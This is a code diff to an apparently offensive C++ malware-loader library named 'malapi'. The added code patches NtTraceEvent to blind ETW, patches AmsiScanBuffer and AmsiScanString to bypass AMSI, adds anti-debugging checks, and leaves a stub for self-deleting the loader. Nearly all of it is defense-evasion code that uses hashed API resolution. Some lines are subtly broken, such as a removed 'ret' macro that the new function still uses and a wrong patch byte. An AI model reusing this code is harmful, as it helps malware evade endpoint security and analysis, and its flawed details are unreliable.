@@ -1458,6 +1458,24 @@ namespace malapi
 		}
 	}
 
+	void PatchFunction(FARPROC function)
+	{
+		HMODULE kernel32 = NULL;
+		DWORD old_protection = 0;
+
+		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
+
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		if (kernel32 == NULL) return;
+		typeVirtualProtectEx VirtualProtectEx = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
+
+		if (!VirtualProtectEx(0, function, 1, PAGE_EXECUTE_READWRITE, &old_protection)) return;
+		memcpy(function, x64_ret, 1);
+		if (!VirtualProtectEx(0, function, 1, old_protection, &old_protection)) return;
+		LOG_SUCCESS("Function Patched!");
+	}
+
 	//
 	// Abuse a bug to disable ETW-Ti for a target process.
 	// More info: https://www.legacyy.xyz/defenseevasion/windows/2024/04/24/disabling-etw-ti-without-ppl.html
@@ -1497,34 +1515,24 @@ namespace malapi
 	BOOL PatchEtwSsn(void)
 	{
 		BOOL success = FALSE;
-		HMODULE kernel32 = NULL;
 		HMODULE ntdll = NULL;
-		DWORD old_protection = 0;
 
 #pragma region imports
 
-		constexpr ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
 		constexpr ULONG hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
 		constexpr ULONG hash_nttraceevent = HashStringFowlerNollVoVariant1a("NtTraceEvent");
-		constexpr ULONG hash_virtualprotectex = HashStringFowlerNollVoVariant1a("VirtualProtectEx");
 
-		kernel32 = GetModuleHandleC(hash_kernel32);
 		ntdll = GetModuleHandleC(hash_ntdll);
-		if (kernel32 == NULL || ntdll == NULL) return success;
+		if (ntdll == NULL) return success;
 
-		typeVirtualProtectEx VirtualProtectEx = (typeVirtualProtectEx)GetProcAddressC(kernel32, hash_virtualprotectex);
 		FARPROC NtTraceEvent = (FARPROC)GetProcAddressC(ntdll, hash_nttraceevent);
 
 #pragma endregion
 
-#define x64_ret "0x3c"
-
-		if (!VirtualProtectEx(0, NtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &old_protection)) goto CLEANUP;
-		memcpy(NtTraceEvent, x64_ret, 1);
-		if (!VirtualProtectEx(0, NtTraceEvent, 1, old_protection, &old_protection)) goto CLEANUP;
+		PatchFunction(NtTraceEvent);
 
 		success = TRUE;
-		LOG_SUCCESS("ETW Patched");
+		LOG_SUCCESS("ETW Patched!");
 	CLEANUP:
 		return success;
 	}
@@ -1622,6 +1630,47 @@ namespace malapi
 		return success;
 	}
 
+	//
+	// Patch AMSI via ScanBuffer
+	//
+	BOOL PatchAmsiScanBuffer(void)
+	{
+		BOOL success = FALSE;
+		HMODULE amsi = NULL;
+		HAMSICONTEXT amsi_context = NULL;
+
+		const ULONG hash_amsi = HashStringFowlerNollVoVariant1a("amsi.dll");
+		const ULONG hash_amsiinitialize = HashStringFowlerNollVoVariant1a("AmsiInitialize");
+		const ULONG hash_amsiscanbuffer = HashStringFowlerNollVoVariant1a("AmsiScanBuffer");
+		const ULONG hash_amsiscanstring = HashStringFowlerNollVoVariant1a("AmsiScanString");
+
+		amsi = GetModuleHandleC(hash_amsi);
+		if (!amsi)
+		{
+			LOG_ERROR("Unable to resolve amsi.dll");
+			return success;
+		}
+
+		typeAmsiInitialize AmsiInitialize = (typeAmsiInitialize)GetProcAddressC(amsi, hash_amsiinitialize);
+		FARPROC AmsiScanBuffer = (FARPROC)GetProcAddressC(amsi, hash_amsiscanbuffer);
+		FARPROC AmsiScanString = (FARPROC)GetProcAddressC(amsi, hash_amsiscanstring);
+
+		if (!AmsiScanBuffer | !AmsiScanString) return success;
+
+		LOG_INFO("AmsiScanBuffer: %016llX", (size_t)AmsiScanBuffer);
+		LOG_INFO("AmsiScanString: %016llX", (size_t)AmsiScanString);
+
+		AmsiInitialize(L"AmsiContext", &amsi_context);
+
+		PatchFunction(AmsiScanBuffer);
+		PatchFunction(AmsiScanString);
+
+		LOG_SUCCESS("Amsi Patched");
+		success = TRUE;
+
+		return success;
+	}
+
 	/////////////////////////////
    //                         //
   //      Anti Debugging     //
@@ -1644,6 +1693,67 @@ namespace malapi
 
 		NtSetInformationThread(ThreadHandle, ThreadHideFromDebugger, NULL, 0);
 		return;
+	}
+
+	//
+	// Check if debugger is present
+	// Return TRUE if being debugged
+	//
+	BOOL IsDebuggerPresent()
+	{
+		BOOL success = FALSE;
+		HMODULE kernel32 = NULL;
+
+		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		const ULONG hash_isdebuggerpresent = HashStringFowlerNollVoVariant1a("IsDebuggerPresent");
+
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return FALSE;
+
+		typeIsDebuggerPresent IsDebuggerPresent = (typeIsDebuggerPresent)GetProcAddressC(kernel32, hash_isdebuggerpresent);
+		success = IsDebuggerPresent();
+
+		if (success)
+		{
+			LOG_INFO("Process Currently being Debugged.");
+			return success;
+		}
+
+		return success;
+	}
+
+	//
+	// Check if the process is being debugged remotely
+	// If it is then return TRUE
+	//
+	BOOL IsRemoteDebuggerPresent(_In_ HANDLE process_handle)
+	{
+		HMODULE kernel32 = NULL;
+		BOOL debugger_present = FALSE;
+		process_handle = INVALID_HANDLE_VALUE;
+
+		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		const ULONG hash_checkremotedebuggerpresent = HashStringFowlerNollVoVariant1a("CheckRemoteDebuggerPresent");
+
+		kernel32 = GetModuleHandleC(hash_kernel32);
+		if (!kernel32) return FALSE;
+
+		typeCheckRemoteDebuggerPresent CheckRemoteDebuggerPresent = (typeCheckRemoteDebuggerPresent)GetProcAddressC(kernel32, hash_checkremotedebuggerpresent);
+		CheckRemoteDebuggerPresent(process_handle, &debugger_present);
+		if (debugger_present)
+		{
+			return debugger_present;
+		}
+
+		return debugger_present;
+	}
+
+	//
+	// T1070.004
+	// Delete Loader if Debugger Present
+	//
+	VOID SelfDeleteLoader()
+	{
 	}
 
 	///////////////////////
